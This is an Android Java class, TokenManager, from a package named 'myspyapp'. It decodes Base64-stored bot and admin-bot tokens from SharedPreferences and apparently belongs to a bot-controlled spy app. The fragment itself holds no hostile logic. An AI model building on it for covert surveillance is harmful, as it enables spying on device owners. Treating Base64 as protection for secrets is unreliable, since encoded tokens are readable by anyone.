package com.mycompany.myspyapp;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;

public class TokenManager {

    public static String getBotToken(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        String encoded = prefs.getString("botToken", null);
        if (encoded != null) {
            return new String(Base64.decode(encoded, Base64.DEFAULT));
        }
        return null;
    }
    
    /**************/

    public static String getAdminBotToken(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        String encoded = prefs.getString("adminBotToken", null);
        if (encoded != null) {
            return new String(Base64.decode(encoded, Base64.DEFAULT));
        }
        return null;
    }
    
    /*********/
}

